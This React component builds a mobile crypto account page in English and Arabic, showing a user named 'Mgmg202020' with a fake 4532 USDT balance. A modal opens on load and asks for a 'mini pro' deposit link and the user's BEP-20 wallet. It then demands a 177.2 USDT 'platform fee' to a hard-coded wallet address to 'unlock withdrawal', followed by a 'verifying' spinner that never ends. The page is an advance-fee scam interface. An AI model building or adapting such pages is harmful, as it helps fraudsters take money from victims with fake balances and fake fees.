
import React, { useState } from 'react';
import { 
  Users, 
  FileText, 
  Wallet, 
  User, 
  ClipboardList, 
  CreditCard, 
  Settings,
  ChevronRight,
  MessageCircle,
  Activity,
  Mail,
  Copy,
  Loader2,
  IdCard,
  History
} from 'lucide-react';

const MinePage: React.FC = () => {
  const [modalStep, setModalStep] = useState<number>(1);
  const [isModalOpen, setIsModalOpen] = useState<boolean>(true);
  const [formData, setFormData] = useState({
    miniProLink: '',
    bep20Address: ''
  });

  const nextStep = () => setModalStep(prev => prev + 1);

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    alert('تم نسخ العنوان');
  };

  return (
    <div className="relative w-full min-h-screen bg-[#F8F8F8] overflow-x-hidden font-sans" dir="ltr">
      {/* Background Content */}
      <div className={`w-full flex flex-col transition-all duration-300 ${isModalOpen ? 'blur-[3px] pointer-events-none' : ''}`}>
        
        {/* Header Section - Pixel Perfect Match */}
        <div className="bg-gradient-to-br from-[#A52A3A] via-[#8C202C] to-[#4B3B3E] px-5 pt-12 pb-10 text-white relative">
          
          {/* Message Icon - Top Right */}
          <div className="absolute top-10 right-5 cursor-pointer">
            <div className="bg-white/10 p-1.5 rounded-full">
               <MessageCircle className="w-6 h-6 text-white fill-white/20" />
            </div>
          </div>

          {/* Profile Section - Left Aligned */}
          <div className="flex items-center gap-4">
            {/* Avatar - Left */}
            <div className="w-[84px] h-[84px] rounded-full border-2 border-white/20 overflow-hidden bg-white shadow-xl flex items-center justify-center">
               <svg viewBox="0 0 100 100" className="w-[85%] h-[85%]">
                  <path d="M50 5 L85 25 L85 65 L50 85 L15 65 L15 25 Z" fill="#EB5353" />
                  <path d="M50 5 L85 25 L50 45 L15 25 Z" fill="#FBC12F" />
                  <path d="M15 25 L50 45 L50 85 L15 65 Z" fill="#9353BF" />
                  <path d="M85 25 L85 65 L50 85 L50 45 Z" fill="#3D92C1" />
                  <circle cx="50" cy="45" r="15" fill="#5EAF5D" />
               </svg>
            </div>
            
            {/* User Info - Next to Avatar */}
            <div className="flex flex-col">
              <div className="flex items-center gap-2">
                <span className="text-[22px] font-bold tracking-tight">Mgmg202020</span>
                <div className="bg-[#FBC02D] text-[#8B0000] text-[9px] px-1.5 py-0.5 rounded-[4px] font-black italic flex items-center justify-center h-4 shadow-sm">
                  VIP 0
                </div>
              </div>
              <p className="text-[13px] text-white/80 mt-1">Invitation code: 616535</p>
            </div>
          </div>

          {/* Account Balance & Action Buttons */}
          <div className="mt-8 flex justify-between items-center">
            {/* My Account - Left */}
            <div className="flex flex-col">
              <span className="text-[14px] font-medium opacity-90">My Account</span>
              <div className="flex items-baseline mt-2">
                <span className="text-[12px] font-medium opacity-70 mr-1.5">USDT</span>
                <span className="text-[28px] font-bold leading-none">4532.1745</span>
              </div>
            </div>

            {/* Action Buttons - Right */}
            <div className="flex gap-6">
              <button className="flex flex-col items-center gap-2">
                <div className="w-[52px] h-[52px] bg-white rounded-[18px] flex items-center justify-center shadow-lg">
                   <div className="w-8 h-8 bg-[#2A66D9] rounded-lg flex items-center justify-center">
                      <Wallet className="w-5 h-5 text-white" />
                   </div>
                </div>
                <span className="text-[11px] font-semibold text-white">Deposit</span>
              </button>
              <button className="flex flex-col items-center gap-2">
                <div className="w-[52px] h-[52px] bg-white rounded-[18px] flex items-center justify-center shadow-lg">
                   <div className="w-8 h-8 bg-[#2A66D9] rounded-lg flex items-center justify-center">
                      <CreditCard className="w-5 h-5 text-white" />
                   </div>
                </div>
                <span className="text-[11px] font-semibold text-white">Withdrawal</span>
              </button>
            </div>
          </div>
        </div>

        {/* Feature Grid Section - Matches Icons and Colors */}
        <div className="bg-white px-2 py-8 flex justify-around items-start">
          <FeatureItem 
            icon={<Users className="text-[#FFA726] fill-[#FFA726]/10" />} 
            label="Teams" 
          />
          <FeatureItem 
            icon={<FileText className="text-[#26A69A] fill-[#26A69A]/10" />} 
            label="Record" 
          />
          <FeatureItem 
            icon={<Activity className="text-[#EF5350] fill-[#EF5350]/10" />} 
            label="Wallet management" 
          />
          <FeatureItem 
            icon={<Mail className="text-[#42A5F5] fill-[#42A5F5]/10" />} 
            label="Invite friends" 
          />
        </div>

        {/* Menu Items Section - Matches styling */}
        <div className="mt-4 px-4 pb-10">
          <div className="bg-white rounded-[16px] shadow-sm overflow-hidden border border-gray-100">
            <MenuItem icon={<IdCard className="text-[#9E9E9E] w-5 h-5" />} label="Profile" />
            <MenuItem icon={<ClipboardList className="text-[#9E9E9E] w-5 h-5" />} label="Deposit records" />
            <MenuItem icon={<History className="text-[#9E9E9E] w-5 h-5" />} label="Withdrawal records" />
            <MenuItem icon={<Settings className="text-[#9E9E9E] w-5 h-5" />} label="Setting" isLast />
          </div>
        </div>
      </div>

      {/* Modal Overlay - Content as requested */}
      {isModalOpen && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center px-6 bg-black/40 backdrop-blur-[2px]" dir="rtl">
          <div className="bg-white w-full max-w-sm rounded-[28px] shadow-2xl overflow-hidden animate-in zoom-in duration-300">
            <div className="p-6 flex flex-col items-center text-center space-y-4">
              
              {modalStep === 1 && (
                <>
                  <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mb-2">
                    <User className="w-8 h-8 text-blue-600" />
                  </div>
                  <h3 className="text-xl font-bold text-gray-800">أهلاً بك Mgmg202020</h3>
                  <p className="text-[15px] text-gray-600 leading-relaxed">
                    تم حل أمر المهام بنجاح. اضغط التالي وقم بوضع رابط المنصة mini pro لقسم الإيداع حصراً.
                  </p>
                  <button 
                    onClick={nextStep}
                    className="w-full py-4 bg-[#8C202C] text-white rounded-2xl font-bold active:scale-95 transition-all text-[16px]"
                  >
                    التالي
                  </button>
                </>
              )}

              {modalStep === 2 && (
                <>
                  <h3 className="text-lg font-bold text-gray-800">رابط منصة mini pro</h3>
                  <p className="text-xs text-gray-500 mb-2">يرجى وضع رابط قسم الإيداع من المنصة</p>
                  <input 
                    type="text"
                    placeholder="ضع الرابط هنا..."
                    className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#8C202C]/20 text-right"
                    value={formData.miniProLink}
                    onChange={(e) => setFormData({...formData, miniProLink: e.target.value})}
                  />
                  <button 
                    onClick={nextStep}
                    disabled={!formData.miniProLink}
                    className="w-full py-4 bg-[#8C202C] text-white rounded-2xl font-bold active:scale-95 transition-all disabled:opacity-50"
                  >
                    التالي
                  </button>
                </>
              )}

              {modalStep === 3 && (
                <>
                  <h3 className="text-lg font-bold text-gray-800">رابط محفظة BEP-20</h3>
                  <p className="text-xs text-gray-500 mb-2">يرجى إدخال عنوان المحفظة الخاص بك لسحب الأرباح</p>
                  <input 
                    type="text"
                    placeholder="0x..."
                    className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-[#8C202C]/20 text-left"
                    value={formData.bep20Address}
                    onChange={(e) => setFormData({...formData, bep20Address: e.target.value})}
                  />
                  <button 
                    onClick={nextStep}
                    disabled={!formData.bep20Address}
                    className="w-full py-4 bg-[#8C202C] text-white rounded-2xl font-bold active:scale-95 transition-all disabled:opacity-50"
                  >
                    التالي
                  </button>
                </>
              )}

              {modalStep === 4 && (
                <>
                  <div className="bg-red-50 p-5 rounded-2xl border border-red-100 text-right w-full">
                    <h3 className="text-[16px] font-bold text-red-800 mb-2">تنبيه نهائي</h3>
                    <p className="text-[13px] text-red-700 leading-relaxed">
                      أهلاً بك Mgmg202020، بقي أمر إيداع مبلغ <span className="font-bold underline">177.2 USDT BEP-20</span> لفتح قناة السحب.
                    </p>
                    <p className="text-[11px] text-gray-500 mt-2 italic">
                      هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro.
                    </p>
                  </div>
                  
                  <div className="w-full space-y-2 mt-4">
                    <p className="text-[10px] text-gray-400 font-medium text-right uppercase tracking-wider">Address (BEP20)</p>
                    <div className="flex items-center gap-2 bg-gray-100 p-3.5 rounded-xl border border-gray-200">
                      <button onClick={() => handleCopy('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d')} className="text-blue-600 active:scale-90 transition-transform">
                        <Copy size={20} />
                      </button>
                      <span className="text-[11px] font-mono text-gray-600 truncate flex-1 text-left">
                        0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d
                      </span>
                    </div>
                  </div>

                  <button 
                    onClick={nextStep}
                    className="w-full py-4 bg-[#8C202C] text-white rounded-2xl font-bold active:scale-95 transition-all mt-4 shadow-xl shadow-[#8C202C]/20"
                  >
                    تم الإيداع
                  </button>
                </>
              )}

              {modalStep === 5 && (
                <div className="py-10 flex flex-col items-center">
                  <Loader2 className="w-14 h-14 text-[#8C202C] animate-spin mb-6" />
                  <h3 className="text-lg font-bold text-gray-800">الرجاء الانتظار</h3>
                  <p className="text-sm text-gray-500 mt-2">جاري التأكد من عملية الإيداع، يرجى عدم إغلاق الصفحة...</p>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

const FeatureItem: React.FC<{ icon: React.ReactNode, label: string }> = ({ icon, label }) => (
  <button className="flex flex-col items-center justify-start w-[85px] active:scale-95 transition-transform">
    <div className="w-12 h-12 flex items-center justify-center mb-2">
      {React.cloneElement(icon as React.ReactElement, { size: 38, strokeWidth: 1.2 })}
    </div>
    <span className="text-[12px] text-[#444] leading-tight text-center font-medium">
      {label}
    </span>
  </button>
);

const MenuItem: React.FC<{ icon: React.ReactNode, label: string, isLast?: boolean }> = ({ icon, label, isLast }) => (
  <button className={`w-full flex items-center justify-between py-5 px-5 active:bg-gray-50 transition-colors ${!isLast ? 'border-b border-gray-50' : ''}`}>
    <div className="flex items-center gap-4">
      <div className="w-6 flex justify-center opacity-80">{icon}</div>
      <span className="text-[15px] text-[#333] font-normal">{label}</span>
    </div>
    <ChevronRight className="w-5 h-5 text-[#D0D0D0]" />
  </button>
);

export default MinePage;
